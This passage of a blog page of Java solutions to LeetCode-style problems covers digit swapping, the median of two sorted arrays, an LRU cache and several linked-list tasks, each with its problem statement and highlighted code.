class="line">Input: 9973</span><br><span class="line">Output: 9973</span><br><span class="line">Explanation: No swap.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumSwap</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] a = Integer.toString(num).toCharArray();</span><br><span class="line">        <span class="type">char</span>[] n=<span class="keyword">new</span> <span class="title class_">char</span>[a.length];</span><br><span class="line">        <span class="type">char</span>[] m=<span class="keyword">new</span> <span class="title class_">char</span>[a.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            n[i]=a[i];</span><br><span class="line">            m[i]=a[i];</span><br><span class="line">        &#125;        </span><br><span class="line">        Arrays.sort(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=a.length-<span class="number">1</span>,j=<span class="number">0</span>;i&gt;=<span class="number">0</span>;i--,j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n[i]!=m[j])&#123;</span><br><span class="line">                swap(m,j,find(m,n[i]));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(<span class="keyword">new</span> <span class="title class_">String</span>(m));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span>[] m,<span class="type">char</span> v)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=m.length-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(v==m[i]) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">char</span> a[],<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">char</span> tmp=a[i];</span><br><span class="line">        a[i]=a[j];</span><br><span class="line">        a[j]=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>O(n)è§£æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumSwap</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] A = Integer.toString(num).toCharArray();</span><br><span class="line">        <span class="type">int</span>[] last = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            last[A[i] - <span class="string">&#x27;0&#x27;</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">9</span>; d &gt; A[i] - <span class="string">&#x27;0&#x27;</span>; d--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (last[d] &gt; i) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">tmp</span> <span class="operator">=</span> A[i];</span><br><span class="line">                    A[i] = A[last[d]];</span><br><span class="line">                    A[last[d]] = tmp;</span><br><span class="line">                    <span class="keyword">return</span> Integer.valueOf(<span class="keyword">new</span> <span class="title class_">String</span>(A));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="median-of-two-sorted-arrays">Median of Two Sorted Arrays</span></h2><p>There are two sorted arrays <strong>nums1</strong> and <strong>nums2</strong> of size m and n respectively.</p><p>Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).</p><p>You may assume <strong>nums1</strong> and <strong>nums2</strong> cannot be both empty.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 3]</span><br><span class="line">nums2 = [2]</span><br><span class="line"></span><br><span class="line">The median is 2.0</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 2]</span><br><span class="line">nums2 = [3, 4]</span><br><span class="line"></span><br><span class="line">The median is (2 + 3)/2 = 2.5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m &gt; n) </span><br><span class="line">            <span class="keyword">return</span> findMedianSortedArrays(nums2, nums1);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>, imin = <span class="number">0</span>, imax = m, half = (m + n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">maxLeft</span> <span class="operator">=</span> <span class="number">0</span>, minRight = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(imin &lt;= imax)&#123;</span><br><span class="line">             i = imin + (imax-imin) / <span class="number">2</span>;</span><br><span class="line">            j = half - i;</span><br><span class="line">            <span class="keyword">if</span>(j &gt; <span class="number">0</span> &amp;&amp; i &lt; m &amp;&amp; nums2[j - <span class="number">1</span>] &gt; nums1[i])&#123;</span><br><span class="line">                imin = i + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; j &lt; n &amp;&amp; nums1[i - <span class="number">1</span>] &gt; nums2[j])&#123;</span><br><span class="line">                imax = i - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    maxLeft = (<span class="type">double</span>)nums2[j - <span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line">                    maxLeft = (<span class="type">double</span>)nums1[i - <span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    maxLeft = (<span class="type">double</span>)Math.max(nums1[i - <span class="number">1</span>], nums2[j - <span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((m + n) % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> maxLeft;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == m)&#123;</span><br><span class="line">            minRight = (<span class="type">double</span>)nums2[j];</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">            minRight = (<span class="type">double</span>)nums1[i];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            minRight = (<span class="type">double</span>)Math.min(nums1[i], nums2[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">double</span>)(maxLeft + minRight) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="swap-adjacent-in-lr-string">Swap Adjacent in LR String</span></h2><p>In a string composed of <code>&#39;L&#39;</code>, <code>&#39;R&#39;</code>, and <code>&#39;X&#39;</code> characters, like <code>&quot;RXXLRXRXL&quot;</code>, a move consists of either replacing one occurrence of <code>&quot;XL&quot;</code> with <code>&quot;LX&quot;</code>, or replacing one occurrence of <code>&quot;RX&quot;</code> with <code>&quot;XR&quot;</code>. Given the starting string <code>start</code> and the ending string <code>end</code>, return <code>True</code> if and only if there exists a sequence of moves to transform one string to the other.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: start = &quot;RXXLRXRXL&quot;, end = &quot;XRLXXRRLX&quot;</span><br><span class="line">Output: True</span><br><span class="line">Explanation:</span><br><span class="line">We can transform start to end following these steps:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canTransform</span><span class="params">(String start, String end)</span> &#123;</span><br><span class="line">       <span class="type">char</span>[] s=start.toCharArray();</span><br><span class="line">       <span class="type">char</span>[] e=end.toCharArray();</span><br><span class="line">       <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(s.length!=e.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(s[i]==<span class="string">&#x27;X&#x27;</span>) cnt++;</span><br><span class="line">           <span class="keyword">if</span>(e[i]==<span class="string">&#x27;X&#x27;</span>) cnt--;</span><br><span class="line">       &#125;        </span><br><span class="line">       <span class="keyword">if</span>(cnt!=<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (p1 &lt; start.length()) &#123;           </span><br><span class="line">       <span class="keyword">while</span> (p1 &lt; s.length &amp;&amp; s[p1] == <span class="string">&#x27;X&#x27;</span>) p1++;</span><br><span class="line">       <span class="keyword">while</span> (p2 &lt; e.length &amp;&amp; e[p2] == <span class="string">&#x27;X&#x27;</span>) p2++;</span><br><span class="line">       <span class="keyword">if</span> (p1 == s.length &amp;&amp; p2 == e.length) <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">       <span class="keyword">if</span> (p1 == s.length || p2 == e.length) <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">       <span class="keyword">if</span>(s[p1] != e[p2]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          </span><br><span class="line">       <span class="keyword">if</span> (s[p1] == <span class="string">&#x27;R&#x27;</span> &amp;&amp; p1 &gt; p2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">if</span> (s[p1] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; p1 &lt; p2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       p1++;</span><br><span class="line">       p2++;</span><br><span class="line">   &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="é“¾è¡¨">é“¾è¡¨</span></h1><h2><span id="merge-k-sorted-lists-">Merge k Sorted Lists -</span></h2><p>Merge <em>k</em> sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(lists==<span class="literal">null</span>||lists.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;ListNode&gt;(lists.length, (a,b)-&gt; a.val-b.val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode tail=dummy;</span><br><span class="line">         <span class="keyword">for</span> (ListNode node:lists)</span><br><span class="line">            <span class="keyword">if</span> (node!=<span class="literal">null</span>)</span><br><span class="line">                q.add(node);</span><br><span class="line">         <span class="keyword">while</span> (!q.isEmpty())&#123;</span><br><span class="line">            tail.next=q.poll();</span><br><span class="line">            tail=tail.next;            </span><br><span class="line">            <span class="keyword">if</span> (tail.next!=<span class="literal">null</span>)</span><br><span class="line">                q.add(tail.next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="lru-">LRU -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRU</span>&#123;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">int</span> cap=<span class="number">0</span>,cnt=<span class="number">0</span>;</span><br><span class="line">    Node tail,head;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="type">int</span> key,val;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> val)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.key=key;</span><br><span class="line">            <span class="built_in">this</span>.val=val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRU</span><span class="params">(<span class="type">int</span> cap)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.cap=cap;</span><br><span class="line">        head=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        tail=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="literal">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(tmp);</span><br><span class="line">        add(tmp);</span><br><span class="line">        <span class="keyword">return</span> tmp.val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="literal">null</span>)&#123;</span><br><span class="line">            Node n=<span class="keyword">new</span> <span class="title class_">Node</span>(key,val);</span><br><span class="line">            add(n);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            tmp.val=val;</span><br><span class="line">           remove(tmp);</span><br><span class="line">            add(tmp);</span><br><span class="line">        &#125;<span class="keyword">if</span>(cnt&gt;cap)&#123;</span><br><span class="line">            map.remove(tail.pre.key);</span><br><span class="line">            remove(tail.pre);            </span><br><span class="line">            cnt--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        Node next=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        next.pre=n;</span><br><span class="line">        n.next=next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        Node before=n.pre,after=n.next;</span><br><span class="line">        before.next=after;</span><br><span class="line">        after.pre=before;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="reverse-nodes-in-k-group-">Reverse Nodes in K-group -</span></h2><p>Given a linked list, reverse the nodes of a linked list <em>k</em> at a time and return its modified list.</p><p><em>k</em> is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of <em>k</em> then left-out nodes in the end should remain as it is.</p><p><strong>Example:</strong></p><p>Given this linked list: <code>1-&gt;2-&gt;3-&gt;4-&gt;5</code></p><p>For <em>k</em> &#x3D; 2, you should return: <code>2-&gt;1-&gt;4-&gt;3-&gt;5</code></p><p>For <em>k</em> &#x3D; 3, you should return: <code>3-&gt;2-&gt;1-&gt;4-&gt;5</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> calLen(head,<span class="number">0</span>);</span><br><span class="line">       ListNode dummy=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       dummy.next=head;</span><br><span class="line">       <span class="type">int</span> cyc=len/k;</span><br><span class="line">       ListNode pre=dummy,l1=head,l2=head;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cyc;i++)&#123;            </span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;k;j++)&#123;</span><br><span class="line">               l2=l2.next;</span><br><span class="line">           &#125;</span><br><span class="line">           ListNode next=l2.next;</span><br><span class="line">           l2.next=<span class="literal">null</span>;</span><br><span class="line">           ListNode tmp=l1;</span><br><span class="line">           reverse(l1);</span><br><span class="line">           pre.next=l2;</span><br><span class="line">           tmp.next=next;</span><br><span class="line">           pre=tmp;</span><br><span class="line">           l1=next;</span><br><span class="line">           l2=next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dummy.next;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">calLen</span><span class="params">(ListNode head,<span class="type">int</span> res)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       <span class="keyword">return</span> calLen(head.next,res+<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(ListNode root)</span>&#123;</span><br><span class="line">       ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">while</span>(root!=<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.next;</span><br><span class="line">           root.next=head.next;</span><br><span class="line">           head.next=root;</span><br><span class="line">           root=tmp;</span><br><span class="line">       &#125;       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="copy-list-with-random-pointer-">Copy List with Random Pointer -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Node <span class="title function_">copyRandomList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        Node phead=head;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="literal">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(phead.val);</span><br><span class="line">            phead.next=tmp;</span><br><span class="line">            tmp.next=next;</span><br><span class="line">            phead=next;</span><br><span class="line">        &#125;</span><br><span class="line">        phead=head;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="literal">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            Node r=phead.random;</span><br><span class="line">            <span class="keyword">if</span>(r!=<span class="literal">null</span>)&#123;</span><br><span class="line">              next.random=r.next;</span><br><span class="line">            &#125;            </span><br><span class="line">            phead=next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        phead=head;</span><br><span class="line">        Node res=head.next;</span><br><span class="line">        <span class="keyword">while</span>(phead!=<span class="literal">null</span>&amp;&amp;phead.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            Node next=phead.next;</span><br><span class="line">            phead.next=next.next;</span><br><span class="line">            phead=next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="merge-two-sorted-lists">Merge Two Sorted Lists âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;        </span><br><span class="line">        ListNode head=<span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> 